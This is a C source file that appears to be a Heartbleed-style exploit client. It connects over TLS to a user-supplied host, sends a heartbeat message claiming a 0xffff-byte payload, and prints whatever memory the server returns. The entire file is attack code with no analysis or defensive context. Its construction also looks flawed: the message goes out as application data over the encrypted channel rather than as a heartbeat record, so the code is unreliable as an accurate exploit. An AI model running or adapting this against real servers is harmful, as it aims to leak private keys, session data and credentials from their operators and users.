#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/err.h>

typedef unsigned char byte;
typedef byte HeartbeatMessageType;
typedef byte ContentType;

typedef struct {
  HeartbeatMessageType type; // 1 for request
  uint16_t payload_length;
} HeartbeatMessage;

void init_openssl() {
  SSL_load_error_strings();
  SSL_library_init();
  ERR_load_BIO_strings();
  OpenSSL_add_all_algorithms();
}

int close_connection(BIO* bio) {
  int r = 0;

  r = BIO_free(bio);

  return r;
}

BIO* connect_encrypted(char* host_and_port, char* store_path, char store_type, SSL_CTX** ctx, SSL** ssl) {
  BIO* bio = NULL;
  int r = 0;

  *ctx = SSL_CTX_new(SSLv23_client_method());
  *ssl = NULL;

  if (store_type == 'f')
    r = SSL_CTX_load_verify_locations(*ctx, store_path, NULL);
  else
    r = SSL_CTX_load_verify_locations(*ctx, NULL, store_path);
  if (r == 0) {
    return NULL;
  }

  bio = BIO_new_ssl_connect(*ctx);
  BIO_get_ssl(bio, ssl);
  if (!(*ssl)) {
    return NULL;
  }
  SSL_set_mode(*ssl, SSL_MODE_AUTO_RETRY);

  BIO_set_conn_hostname(bio, host_and_port);

  if (BIO_do_connect(bio) < 1) {
    return NULL;
  }

  return bio;
}


int main(int argc, char** argv) {

  char* host_and_port = argv[1];
  char* store_path = "/etc/ssl/certs/";
  char store_type = 'd';
  char connection_type = 'e';

  char buffer[4096];
  buffer[0] = 0;

  BIO* bio;
  SSL_CTX* ctx = NULL;
  SSL* ssl = NULL;

  init_openssl();

  if ((bio = connect_encrypted(host_and_port, store_path, store_type, &ctx, &ssl)) == NULL)
    return (EXIT_FAILURE);

  HeartbeatMessage * hbmsg = malloc(sizeof(HeartbeatMessage));
  hbmsg->type = 1;
  hbmsg->payload_length = 0xffff;
  BIO_write(bio,hbmsg,sizeof(HeartbeatMessage));

  int err = 0;
  while(1) {
    err = BIO_read(bio,buffer,4*1024);
    if (err <= 0)
      break;
    fwrite(buffer,1,err,stdout);
    fflush(stdout);
  }

  return (EXIT_SUCCESS);
}
